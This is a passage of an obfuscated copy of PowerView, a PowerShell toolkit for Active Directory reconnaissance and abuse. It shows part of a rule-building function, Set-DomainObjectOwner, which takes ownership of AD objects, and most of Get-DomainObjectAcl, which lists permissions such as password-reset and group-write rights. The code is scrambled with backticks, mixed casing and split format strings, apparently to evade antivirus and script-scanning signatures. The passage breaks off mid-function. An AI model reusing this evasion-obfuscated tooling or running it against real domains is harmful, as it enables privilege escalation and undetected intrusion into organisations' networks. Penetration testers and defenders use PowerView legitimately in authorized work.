                'Identity' = ${pr`inCiPALI`D`ENtITy}
                'Properties' = 'distinguishedname,objectsid'
            }
            if (${PS`BouNDPaR`AM`ET`eRs}['PrincipalDomain']) { ${Pr`inCipALsEAR`chE`RaRGu`meNTs}['Domain'] = ${P`Rin`Ci`PAldOMA`iN} }
            if (${pSb`ouNdparA`m`E`Te`Rs}['Server']) { ${PRIn`CIPA`LseArcHeRA`RG`U`menTs}['Server'] = ${seR`VER} }
            if (${PSboU`NDp`ARAM`e`TERS}['SearchScope']) { ${P`RiNCiPaLs`EarC`HEra`RG`UM`eNTS}['SearchScope'] = ${sEa`R`CHSCoPe} }
            if (${p`Sbound`par`A`MeT`ERS}['ResultPageSize']) { ${priNCI`paL`s`eaR`C`HERARguMen`TS}['ResultPageSize'] = ${RE`Su`lTPaG`e`SiZe} }
            if (${pSBO`UN`Dp`A`Ra`MeTERS}['ServerTimeLimit']) { ${pri`NC`IpaLSEaRcher`ARGu`m`EntS}['ServerTimeLimit'] = ${SERv`Er`TimELIMIt} }
            if (${PSB`Ou`NdP`A`RAmE`TErs}['Tombstone']) { ${pRI`NC`I`PALsEARc`heRa`RGuments}['Tombstone'] = ${TO`MbStO`Ne} }
            if (${PsBOU`NDPA`RaM`ETERS}['Credential']) { ${PR`I`NcIpALSE`Arc`herARGUm`EnTs}['Credential'] = ${c`R`EDE`NTIal} }
            ${pR`InCiP`Al} = &("{3}{0}{1}{2}{4}"-f't','-Domai','nO','Ge','bject') @PrincipalSearcherArguments
            if (-not ${P`RiNc`ipAL}) {
                throw "Unable to resolve principal: $PrincipalIdentity"
            }
            elseif(${PR`iNCiP`Al}.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            ${oBJ`e`ctSiD} = ${P`RInc`iP`Al}.objectsid
        }
        else {
            ${O`Bje`CtSId} = ${PRiN`cI`pAl`i`deNtiTy}
        }

        ${aD`RIg`ht} = 0
        foreach(${r} in ${riG`ht}) {
            ${a`DRIG`HT} = ${aD`RIg`Ht} -bor (([System.DirectoryServices.ActiveDirectoryRights]${R}).value__)
        }
        ${AD`RigHT} = [System.DirectoryServices.ActiveDirectoryRights]${AD`Rig`ht}

        ${IDeN`T`ITy} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${Ob`Ject`Sid})
    }

    Process {
        if(${PScm`DlET}.ParameterSetName -eq 'AuditRuleType') {

            if(${o`BJ`E`cTTyPe} -eq ${Nu`Ll} -and ${INH`e`Ri`TanCET`YPE} -eq [String]::Empty -and ${INhE`RiTEDOBj`e`c`TTy`PE} -eq ${n`UlL}) {
                &("{0}{1}{2}"-f'New-Obje','c','t') ("{6}{2}{7}{3}{1}{8}{9}{0}{5}{4}"-f'i','es.','ct','rvic','toryAuditRule','rec','System.Dire','orySe','Acti','veD') -ArgumentList ${id`ENTItY}, ${AD`RIgHt}, ${Audi`TFl`Ag}
            } elseif(${OBJ`E`C`TtyPe} -eq ${Nu`LL} -and ${iNHe`RIta`N`C`eType} -ne [String]::Empty -and ${i`N`Heri`TE`DObj`E`ctTypE} -eq ${n`ULL}) {
                &("{1}{2}{0}" -f 'ect','New-Ob','j') ("{1}{5}{4}{3}{0}{2}{6}{7}{8}{10}{9}" -f'.D','Sy','irector','m','te','s','yServi','ces.A','ctiveDirectoryAuditR','e','ul') -ArgumentList ${I`dent`ITy}, ${A`dri`GHT}, ${AU`Di`TF`LAg}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${inHEr`ItanCe`T`Ype})
            } elseif(${obJ`eC`TTyPE} -eq ${Nu`ll} -and ${INh`eri`TAnC`EtYPe} -ne [String]::Empty -and ${iNHerI`T`e`DoB`jECTTypE} -ne ${Nu`Ll}) {
                &("{2}{1}{0}" -f 't','jec','New-Ob') ("{5}{6}{1}{4}{8}{3}{7}{0}{2}"-f'Rul','rectoryServices.Act','e','ct','iveD','Syst','em.Di','oryAudit','ire') -ArgumentList ${i`De`NT`ITy}, ${aD`R`igHT}, ${aUdi`TF`L`Ag}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${I`NHE`RI`T`ANcETypE}), ${InhErit`Edob`JEcT`Ty`PE}
            } elseif(${o`BJEc`TTYpE} -ne ${N`Ull} -and ${InheRiT`AN`CEt`y`pe} -eq [String]::Empty -and ${InhERI`T`E`dobje`CttY`PE} -eq ${n`ULL}) {
                &("{0}{2}{1}"-f 'N','ct','ew-Obje') ("{6}{7}{10}{1}{2}{3}{5}{8}{0}{13}{12}{9}{11}{4}"-f'e','em.','Di','rectoryServi','itRule','ces.A','Sy','s','ctiv','o','t','ryAud','t','Direc') -ArgumentList ${iDen`TI`Ty}, ${AD`RIgHT}, ${A`UDI`TflAg}, ${Obj`ec`TTYPe}
            } elseif(${OBJE`cT`TyPE} -ne ${N`Ull} -and ${in`he`Rit`ANce`TYPe} -ne [String]::Empty -and ${Inhe`RI`Ted`oBje`CtTY`pE} -eq ${nu`ll}) {
                &("{1}{0}{2}"-f'w','Ne','-Object') ("{10}{3}{5}{14}{4}{7}{0}{12}{11}{6}{13}{1}{2}{9}{8}" -f'r','Dir','ectoryAu','st','ire','e','s.A','ctorySe','Rule','dit','Sy','ice','v','ctive','m.D') -ArgumentList ${idE`N`TiTY}, ${ad`R`IgHt}, ${aUd`iT`FLAg}, ${OB`j`e`cTtYPE}, ${I`NhERItanC`E`Ty`PE}
            } elseif(${oB`je`CTTYpe} -ne ${N`ULl} -and ${IN`HERiT`AN`cETY`PE} -ne [String]::Empty -and ${IN`H`ER`iTedObjE`Ctt`ype} -ne ${n`ULl}) {
                &("{1}{0}{2}"-f 'bj','New-O','ect') ("{4}{1}{9}{11}{8}{0}{6}{10}{3}{2}{5}{7}" -f'e','m.Direc','oryAudi','rect','Syste','tRu','s.Activ','le','yServic','t','eDi','or') -ArgumentList ${ide`Nt`i`TY}, ${AdRiG`Ht}, ${auD`It`FlAG}, ${obJEc`TT`yPe}, ${In`hErITAncET`y`Pe}, ${INhE`RI`TEdo`BJe`cTTyPE}
            }

        }
        else {

            if(${OBJe`ctT`YpE} -eq ${nU`lL} -and ${in`H`ERitA`NC`eT`ypE} -eq [String]::Empty -and ${I`NHERi`TEDOBJECt`T`y`PE} -eq ${NU`LL}) {
                &("{1}{2}{0}"-f 'ct','Ne','w-Obje') ("{4}{9}{1}{8}{0}{11}{5}{3}{6}{7}{10}{2}"-f 'erv','cto','Rule','e','System.Di','.ActiveDir','ctory','A','ryS','re','ccess','ices') -ArgumentList ${IDEn`TitY}, ${aD`R`IgHt}, ${aCcESSc`oN`TR`oL`T`yPe}
            } elseif(${Ob`j`ECTtyPE} -eq ${nU`lL} -and ${I`Nh`e`RitaNC`etYPe} -ne [String]::Empty -and ${iNH`ERI`TEDObj`eCTtYPe} -eq ${N`UlL}) {
                &("{0}{1}{2}"-f 'N','ew-Obje','ct') ("{6}{2}{1}{9}{4}{5}{0}{3}{10}{8}{7}"-f'e','DirectoryServic','.','Direc','Acti','v','System','ccessRule','ryA','es.','to') -ArgumentList ${i`D`eNt`ITy}, ${aDr`IghT}, ${ACCES`sCon`TROLt`YpE}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${inh`ErItaN`c`EtYpe})
            } elseif(${O`B`jecttYpE} -eq ${N`ULL} -and ${in`HeRITA`Nc`e`TYpe} -ne [String]::Empty -and ${InHe`R`I`TEDObJEcttYpe} -ne ${n`ULL}) {
                &("{2}{1}{0}"-f 'ject','ew-Ob','N') ("{9}{2}{5}{7}{10}{4}{6}{0}{8}{1}{3}" -f 'yAc','s','m.Dire','sRule','irect','ctoryServices.Ac','or','tiv','ce','Syste','eD') -ArgumentList ${IdEN`Ti`TY}, ${AdrI`GhT}, ${AccesS`coNt`R`ol`TY`Pe}, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]${iN`heR`i`TanCETYpe}), ${In`H`ERi`TEdobj`ECT`TYpE}
            } elseif(${O`BJeCtt`yPE} -ne ${n`ULl} -and ${INhE`Ri`Ta`Nc`EtYPE} -eq [String]::Empty -and ${iN`HErIte`dObjE`CTtyPe} -eq ${N`ULl}) {
                &("{3}{2}{0}{1}" -f'w-Ob','ject','e','N') ("{1}{12}{5}{3}{6}{10}{7}{9}{0}{11}{4}{8}{2}" -f'ctiveDirec','S','sRule','m','ryA','te','.Dir','ervic','cces','es.A','ectoryS','to','ys') -ArgumentList ${IdeN`TI`Ty}, ${Ad`R`IGht}, ${aCcEsS`COn`Tr`Ol`TypE}, ${oB`JE`CTt`yPE}
            } elseif(${OBJ`EctTY`pE} -ne ${n`ULl} -and ${i`NheriTanc`eTYpE} -ne [String]::Empty -and ${I`NhEriTeDobjEc`T`Ty`pe} -eq ${n`UlL}) {
                &("{2}{0}{1}"-f'bje','ct','New-O') ("{8}{3}{9}{0}{6}{2}{7}{11}{10}{1}{5}{4}" -f 'm.Direc','Dir','s.','t','oryAccessRule','ect','toryService','A','Sys','e','tive','c') -ArgumentList ${id`enTItY}, ${a`dr`igHT}, ${acCess`COn`TR`o`ltyPe}, ${obJ`e`Ctt`ype}, ${i`Nh`er`IT`A`NCEtYpE}
            } elseif(${oBJ`ecT`TYpe} -ne ${N`Ull} -and ${In`H`eri`Ta`NcETYPe} -ne [String]::Empty -and ${INH`erItEd`o`B`Jec`TTypE} -ne ${NU`lL}) {
                &("{2}{1}{0}" -f 'ect','j','New-Ob') ("{0}{5}{8}{6}{2}{3}{4}{7}{1}{9}"-f 'S','ryAc','s.','A','ctiveDire','ystem','e','cto','.DirectoryServic','cessRule') -ArgumentList ${iDe`N`T`itY}, ${a`dR`IghT}, ${AcCESSc`on`TRoL`TYpe}, ${O`B`jeCtTYpE}, ${I`Nh`ERItaN`CetYPe}, ${InHEriTe`doB`JECTT`y`Pe}
            }

        }
    }
}


function set-d`oMA`inoB`jeCTownER {
<#
.SYNOPSIS

Modifies the owner for a specified active directory object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

Retrieves the Active Directory object specified by -Identity by splatting to
Get-DomainObject, returning the raw searchresult object. Retrieves the raw
directoryentry for the object, and sets the object owner to -OwnerIdentity.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
of the AD object to set the owner for.

.PARAMETER OwnerIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
of the owner to set for -Identity.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y

Set the owner of 'dfm' in the current domain to 'harmj0y'.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y -Credential $Cred

Set the owner of 'dfm' in the current domain to 'harmj0y' using the alternate credentials.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${T`RUe}, ValueFromPipeline = ${TR`UE}, ValueFromPipelineByPropertyName = ${tR`Ue})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        ${IDen`TI`TY},

        [Parameter(Mandatory = ${tr`UE})]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        ${o`WNE`RiDen`TI`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`om`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${ldaPf`Il`T`Er},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${S`e`ArchB`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SE`RV`Er},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SE`A`RcHsco`Pe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${rEsU`LTPAG`eSiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`Rve`RT`iME`LiMIT},

        [Switch]
        ${tOMBST`o`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RE`dent`iAL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${sE`Ar`CH`erArGumEn`TS} = @{}
        if (${psBo`Und`PaR`AmETE`Rs}['Domain']) { ${SearChER`A`RgUmE`Nts}['Domain'] = ${d`oMaIn} }
        if (${Ps`Bou`N`dpaRAMeT`E`RS}['LDAPFilter']) { ${SeaR`C`HeraRguMe`Nts}['LDAPFilter'] = ${lda`p`FilteR} }
        if (${pSBo`U`Nd`pAram`e`TeRS}['SearchBase']) { ${SEa`RCH`erarGUm`eNTs}['SearchBase'] = ${SE`A`RCh`BaSE} }
        if (${pSBoU`Nd`p`Ara`Met`ers}['Server']) { ${seA`R`Che`RArGU`MenTs}['Server'] = ${Se`Rver} }
        if (${PsbOUnDpaRAm`E`T`ErS}['SearchScope']) { ${sEAr`C`hERar`GumeN`TS}['SearchScope'] = ${Sea`RCh`SCope} }
        if (${pS`BOunDPa`RA`Met`erS}['ResultPageSize']) { ${S`e`ArCHERa`RGUm`en`TS}['ResultPageSize'] = ${Res`ULTp`AG`esi`ze} }
        if (${PSBouN`D`pARam`E`TErS}['ServerTimeLimit']) { ${se`ARch`erArGUM`e`NTS}['ServerTimeLimit'] = ${se`RVERtI`MEl`ImIt} }
        if (${p`sb`o`UNDP`ARaMe`TErs}['Tombstone']) { ${sE`Ar`CheraRGumE`NTS}['Tombstone'] = ${t`ombSt`oNe} }
        if (${P`s`BouNDp`A`RAmeTErS}['Credential']) { ${sEAr`C`h`ERA`RGuMeN`Ts}['Credential'] = ${Cre`D`EN`Tial} }

        ${oWN`E`Rs`id} = &("{1}{2}{3}{0}" -f 'omainObject','Ge','t-','D') @SearcherArguments -Identity ${oWner`Id`EnT`I`Ty} -Properties ("{2}{1}{3}{0}" -f'id','bje','o','cts') | &("{1}{2}{0}"-f 'ect','Select-','Obj') -ExpandProperty ("{1}{2}{0}"-f 'tsid','o','bjec')
        if (${O`WNe`R`SId}) {
            ${OwN`er`IdeN`Ti`T`Y`REFerEnCE} = [System.Security.Principal.SecurityIdentifier]${oW`Ner`siD}
        }
        else {
            &("{4}{3}{0}{2}{1}"-f 'e-War','g','nin','t','Wri') "[Set-DomainObjectOwner] Error parsing owner identity '$OwnerIdentity'"
        }
    }

    PROCESS {
        if (${ow`NeR`ideN`T`iTyReFERENcE}) {
            ${sEa`Rc`hERA`RG`U`mEnTS}['Raw'] = ${tr`UE}
            ${sEar`ChE`RArgU`m`eNts}['Identity'] = ${Id`en`T`Ity}

            # splat the appropriate arguments to Get-DomainObject
            ${R`A`WObjEcT} = &("{0}{4}{2}{1}{3}"-f 'Ge','Obje','n','ct','t-Domai') @SearcherArguments

            ForEach (${o`BJE`Ct} in ${R`Aw`oBj`Ect}) {
                try {
                    &("{0}{2}{1}"-f'Write-Ve','ose','rb') "[Set-DomainObjectOwner] Attempting to set the owner for '$Identity' to '$OwnerIdentity'"
                    ${e`N`Try} = ${rA`w`obJect}.GetDirectoryEntry()
                    ${E`NTrY}.PsBase.Options.SecurityMasks = 'Owner'
                    ${EN`TRy}.PsBase.ObjectSecurity.SetOwner(${ow`Ne`RI`dE`NTiTyRE`F`eREnCe})
                    ${eN`T`Ry}.PsBase.CommitChanges()
                }
                catch {
                    &("{2}{1}{0}"-f'ng','te-Warni','Wri') "[Set-DomainObjectOwner] Error setting owner: $_"
                }
            }
        }
    }
}


function geT-DO`mainO`BjEcta`cl {
<#
.SYNOPSIS

Returns the ACLs associated with a specific active directory object. By default
the DACL for the object(s) is returned, but the SACL can be returned with -Sacl.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainGUIDMap  

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted.

.PARAMETER Sacl

Switch. Return the SACL instead of the DACL for the object (default behavior).

.PARAMETER ResolveGUIDs

Switch. Resolve GUIDs to their display names.

.PARAMETER RightsFilter

A specific set of rights to return ('All', 'ResetPassword', 'WriteMembers').

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainObjectAcl -Identity matt.admin -domain testlab.local -ResolveGUIDs

Get the ACLs for the matt.admin user in the testlab.local domain and
resolve relevant GUIDs to their display names.

.EXAMPLE

Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs

Enumerate the ACL permissions for all OUs in the domain.

.EXAMPLE

Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs -Sacl

Enumerate the SACLs for all OUs in the domain, resolving GUIDs.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainObjectAcl -Credential $Cred -ResolveGUIDs

.OUTPUTS

PowerView.ACL

Custom PSObject with ACL entries.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${T`RUe}, ValueFromPipelineByPropertyName = ${tr`UE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${IdENti`TY},

        [Switch]
        ${Sa`cl},

        [Switch]
        ${re`s`OlvEgUiDs},

        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        ${rI`gHtSFI`LtER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`omain},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${lDA`pFIl`TeR},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${s`E`A`RCHBaSe},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${S`eRv`eR},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sEar`C`hsC`Ope} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${r`esUlT`Pag`ESIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`RVertimE`L`IM`iT},

        [Switch]
        ${t`omB`stOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRE`deN`T`iaL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${SeaRc`HEr`ArG`U`meN`TS} = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }

        if (${Ps`B`oUN`DP`Ar`AMETERS}['Sacl']) {
            ${sE`Ar`CHERa`RGuMEnts}['SecurityMasks'] = 'Sacl'
        }
        else {
            ${SEARc`hERarG`U`mENts}['SecurityMasks'] = 'Dacl'
        }
        if (${pSboUndPAR`Am`e`TErS}['Domain']) { ${SearC`HEr`ARGuME`NTs}['Domain'] = ${d`o`MAIn} }
        if (${PSBo`UNdpAr`A`MetE`RS}['SearchBase']) { ${s`EarCh`E`Rarg`UMen`TS}['SearchBase'] = ${sEarc`H`B`Ase} }
        if (${p`sbo`Un`DparaMEte`Rs}['Server']) { ${se`AR`ch`eRarGumEN`Ts}['Server'] = ${Ser`VeR} }
        if (${psBOU`ND`Par`AmET`ErS}['SearchScope']) { ${SEARChE`R`Argume`N`Ts}['SearchScope'] = ${sEa`RCHS`cOpe} }
        if (${p`SBo`UnDPaRA`m`ETErs}['ResultPageSize']) { ${s`E`ArcHerarG`UMeNTs}['ResultPageSize'] = ${r`esuLtP`AGE`SizE} }
        if (${p`SBo`UN`dp`ARAMETErS}['ServerTimeLimit']) { ${s`E`ARcHeRA`RGumen`Ts}['ServerTimeLimit'] = ${SERVeRT`imeLi`m`it} }
        if (${pS`B`ouNdP`ARAM`eTE`Rs}['Tombstone']) { ${SEaR`che`Ra`RGuMentS}['Tombstone'] = ${to`mb`stOne} }
        if (${p`sBo`Un`Dp`ARaMETers}['Credential']) { ${sea`RC`he`RaRg`UMEnts}['Credential'] = ${C`REd`enTiaL} }
        ${SEArch`er} = &("{2}{4}{0}{5}{1}{3}"-f'Doma','nSearche','G','r','et-','i') @SearcherArguments

        ${DoMAi`NGUi`DmAPaRgume`N`Ts} = @{}
        if (${P`s`BOu`NdpARAME`T`ers}['Domain']) { ${DomA`iNguiD`mA`PaRgUM`EntS}['Domain'] = ${D`O`mAIn} }
        if (${PS`BO`U`N`DParAMeTers}['Server']) { ${D`oM`AiNGu`iDMapARGumeNTS}['Server'] = ${sER`V`er} }
        if (${P`sbo`U`NdpArAmEt`Ers}['ResultPageSize']) { ${DOm`AiNg`UiD`MApA`RgU`m`e`Nts}['ResultPageSize'] = ${rEsultpAg`e`SI`zE} }
        if (${P`s`BOUNdPARa`m`etErS}['ServerTimeLimit']) { ${doMaiNguidmA`p`A`RGUmENTs}['ServerTimeLimit'] = ${sE`R`VeR`Ti`MElImIT} }
        if (${pSboUNd`pA`R`AMeteRs}['Credential']) { ${dOmAiN`gU`id`M`A`pArGUmeNts}['Credential'] = ${cRe`dEN`Tial} }

        # get a GUID -> name mapping
        if (${PSBOU`N`DPAr`AmEteRs}['ResolveGUIDs']) {
            ${GU`IDS} = &("{1}{4}{2}{5}{3}{0}" -f 'p','Get','G','a','-Domain','UIDM') @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if (${seaRc`h`Er}) {
            ${IDe`NTITY`FI`Lter} = ''
            ${F`iL`TER} = ''
            ${Iden`T`I`TY} | &("{2}{0}{1}"-f'her','e-Object','W') {${_}} | &("{0}{2}{3}{1}"-f 'ForE','bject','a','ch-O') {
                ${IDeNTIt`yI`NSta`NcE} = ${_}.Replace('(', '\28').Replace(')', '\29')
                if (${iDEn`TITYI`N`St`ANcE} -match '^S-1-.*') {
                    ${iDE`NT`iT`YFIltEr} += "(objectsid=$IdentityInstance)"
                }
                elseif (${I`d`ent`ITy`iN`sTAnCE} -match '^(CN|OU|DC)=.*') {
                    ${IDeNtit`y`FI`lTEr} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${psbou`Nd`p`ARAMEtERS}['Domain']) -and (-not ${PsBou`N`Dpa`R`AmeT`erS}['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        ${ideNT`ItYD`omain} = ${ideNT`ITy`I`N`stAn`ce}.SubString(${idE`NtIt`YiN`sTaNcE}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{2}{0}" -f'e','Writ','e-Verbos') "[Get-DomainObjectAcl] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        ${SEA`R`cheRaRGU`m`en`Ts}['Domain'] = ${i`d`eNtItYD`OmAin}
                        ${sEARc`H`eR} = &("{4}{3}{1}{0}{5}{2}"-f 'a','m','earcher','Do','Get-','inS') @SearcherArguments
                        if (-not ${SE`A`RcHER}) {
                            &("{2}{1}{0}{3}{4}" -f 'a','rite-W','W','r','ning') "[Get-DomainObjectAcl] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif (${ID`eNT`It`YI`NsTaNCE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${gUidBYt`es`Tr`i`NG} = (([Guid]${IDeNTiTy`i`Ns`TA`N`cE}).ToByteArray() | &("{0}{3}{2}{1}{4}" -f'Fo','jec','ch-Ob','rEa','t') { '\' + ${_}.ToString('X2') }) -join ''
                    ${i`DenT`ITyf`ILtER} += "(objectguid=$GuidByteString)"
                }
                elseif (${iDE`NTIT`YI`Nstan`CE}.Contains('.')) {
                    ${Ident`IT`YfiL`TER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    ${ID`E`Nt`ItYFILtER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (${iDeNtiT`YfiL`T`eR} -and (${Id`ENTI`Ty`FIlt`ER}.Trim() -ne '') ) {
                ${F`iL`TEr} += "(|$IdentityFilter)"
            }

            if (${pSBoUN`dpaRA`me`T`ERs}['LDAPFilter']) {
                &("{4}{3}{1}{2}{0}"-f'se','ite-Verb','o','r','W') "[Get-DomainObjectAcl] Using additional LDAP filter: $LDAPFilter"
                ${fILT`er} += "$LDAPFilter"
            }

            if (${f`il`TER}) {
                ${S`eA`Rcher}.filter = "(&$Filter)"
            }
            &("{1}{2}{0}{3}" -f 'erbo','Writ','e-V','se') "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter)"

            ${Re`Su`lts} = ${s`Ear`cH`er}.FindAll()
            ${rE`Sul`TS} | &("{0}{1}{2}" -f 'Wh','ere-Obj','ect') {${_}} | &("{3}{0}{4}{2}{1}" -f'rE','bject','O','Fo','ach-') {
                ${OBje`Ct} = ${_}.Properties

                if (${ObJ`e`CT}.objectsid -and ${Ob`JECt}.objectsid[0]) {
                    ${o`B`JE`ctsiD} = (&("{1}{2}{0}" -f 't','New','-Objec') ("{1}{8}{6}{4}{5}{3}{9}{7}{0}{2}" -f'nt','Syste','ifier','y.','ecur','it','S','incipal.SecurityIde','m.','Pr')(${O`Bj`Ect}.objectsid[0],0)).Value
                }
                else {
                    ${O`BJeC`TsiD} = ${n`ULl}
                }

                try {
                    &("{0}{1}{2}" -f'New','-Objec','t') ("{3}{4}{1}{6}{5}{8}{7}{0}{2}"-f'tyD','Ac','escriptor','Securi','ty.','S','cessControl.Raw','i','ecur') -ArgumentList ${Ob`jEcT}['ntsecuritydescriptor'][0], 0 | &("{1}{2}{0}"-f 'ct','ForEa','ch-Obje') { if (${P`SB`ounDPaR`AM`eTe`Rs}['Sacl']) {${_}.SystemAcl} else {${_}.DiscretionaryAcl} } | &("{1}{0}{2}"-f'or','F','Each-Object') {
                        if (${PS`B`OUn`DP`ARaMeTers}['RightsFilter']) {
                            ${GUId`FIlT`eR} = Switch (${R`igHTSFi`Lt`Er}) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                ("{1}{2}{0}"-f'lt','Def','au') { '00000000-0000-0000-0000-000000000000' }
                            }
                            if (${_}.ObjectType -eq ${gU`ID`FIlteR}) {
                                ${_} | &("{0}{1}{2}"-f'A','dd-Me','mber') ("{3}{0}{1}{2}" -f 'ePr','ope','rty','Not') 'ObjectDN' ${ob`jE`CT}.distinguishedname[0]
                                ${_} | &("{1}{2}{0}" -f 'er','Add-M','emb') ("{0}{2}{1}"-f 'NoteP','operty','r') 'ObjectSID' ${o`B`jeCTsId}
                                ${c`oNTiNuE} = ${Tr`Ue}
                            }
                        }
                        else {
                            ${_} | &("{0}{1}{2}" -f 'Add','-Me','mber') ("{1}{0}{2}" -f'Prope','Note','rty') 'ObjectDN' ${oB`JEct}.distinguishedname[0]
                            ${_} | &("{0}{2}{1}" -f'Add-Me','er','mb') ("{0}{2}{1}"-f 'No','perty','tePro') 'ObjectSID' ${Obje`C`TSiD}
                            ${co`N`TINUE} = ${tr`Ue}
                        }

                        if (${C`ontINUe}) {
